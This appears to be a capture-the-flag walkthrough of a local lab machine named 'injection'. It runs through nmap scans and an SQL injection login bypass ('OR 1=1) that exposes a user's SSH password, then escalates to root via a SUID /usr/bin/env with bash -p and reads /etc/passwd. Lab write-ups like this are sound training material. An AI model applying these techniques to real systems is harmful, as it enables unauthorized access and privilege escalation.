# Run the injection machine
```
 sudo bash auto_deploy.sh injection.tar
```
 sudo bash auto_deploy.sh injection.tar
[sudo] password for kali: 

Estamos desplegando la máquina vulnerable, espere un momento.                             

Máquina desplegada, su dirección IP es --> 172.17.0.2                                     

Presiona Ctrl+C cuando termines con la máquina para eliminarla    


# Look for all the open ports
```
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG openports
```
```
File: openports
───────┼──────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Sun Apr 20 17:10:28 2025 as: /usr/lib/nmap/nmap -p- --
       │ open --min-rate 5000 -vvv -n -Pn -oG openports 172.17.0.2
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 172.17.0.2 () Status: Up
   4   │ Host: 172.17.0.2 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///    Ignored S
       │ tate: closed (65533)
   5   │ # Nmap done at Sun Apr 20 17:10:29 2025 -- 1 IP address (1 host up) scanned in 0.
       │ 98 seconds
```
# Scan for the servies and versions running in the open ports
```
sudo nmap -sCV -p 22,80 -vvv 172.17.0.2 -oN service_vul_scan

```
```
┬──────────────────────────────────────────────────────────────────────────────────
       │ File: service_vul_scan
───────┼──────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Sun Apr 20 17:29:47 2025 as: /usr/lib/nmap/nmap -sCV -
       │ p 22,80 -vvv -oN service_vul_scan 172.17.0.2
   2   │ Nmap scan report for 172.17.0.2
   3   │ Host is up, received arp-response (0.000075s latency).
   4   │ Scanned at 2025-04-20 17:29:47 AEST for 6s
   5   │ 
   6   │ PORT   STATE SERVICE REASON         VERSION
   7   │ 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux
       │ ; protocol 2.0)
   8   │ | ssh-hostkey: 
   9   │ |   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
  10   │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9Urfk
       │ zVjvriOVFwT9rOHz6XGJrVwKK/A6RMody6c0ovLNeCgaU6kCb+dGPPeXwCaio++IwxYm0SxRGYITrhr4=
  11   │ |   256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
  12   │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJV4CYnqtqSQxWkpfq7xR8DG/nHJfLXDhtkyMHA5pLh
       │ O
  13   │ 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
  14   │ | http-methods: 
  15   │ |_  Supported Methods: GET HEAD POST OPTIONS
  16   │ |_http-title: Iniciar Sesi\xC3\xB3n
  17   │ |_http-server-header: Apache/2.4.52 (Ubuntu)
  18   │ | http-cookie-flags: 
  19   │ |   /: 
  20   │ |     PHPSESSID: 
  21   │ |_      httponly flag not set
  22   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  23   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  24   │
```
# Lets look what the website is running
```
whatweb 172.17.0.2
```
```
http://172.17.0.2 [200 OK] Apache[2.4.52], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], PasswordField[password], Title[Iniciar Sesión]
```
# lets access the website
```
172.17.0.2
```
It takes us to the log in page
we can try and perform sql injection in those fields
```
user: 'OR 1=1;
password: 123
```
we try to log on as the first user and it was successful
We get an pop up 
```
Welcome Dylan. You have correctly inserted your password: KJSDFG789FGSDF78
```
# Since ssh is open we can try to log in as dylan and use the password we got
```
ssh dylan@172.17.0.2
dylan@172.17.0.2's password:
```
we get access as the dylan
```
dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.12.20-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```
# lets check if we have root priviliges
```
dylan@52fb1b04c80a:~$ sudo -l
-bash: sudo: command not found
```
since there is no bash shell lets try to search for binaries that have root permission
```
find / -perm -4000 2>/dev/null
```/usr/bin/chfn
/usr/bin/umount
/usr/bin/env
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
lets execute the the binary
```
/usr/bin/env /bin/bash
```
```
dylan@52fb1b04c80a:~$ /usr/bin/env /bin/bash
bash-5.1$ whoami
dylan
bash-5.1$ exit
```
the EUID on /usr/bin/env was not preserved so lets try again
```
/usr/bin/env /bin/bash -p
```
the result was as follows
```
dylan@52fb1b04c80a:~$ /usr/bin/env /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
systemd-network:x:102:104:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:105:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
```


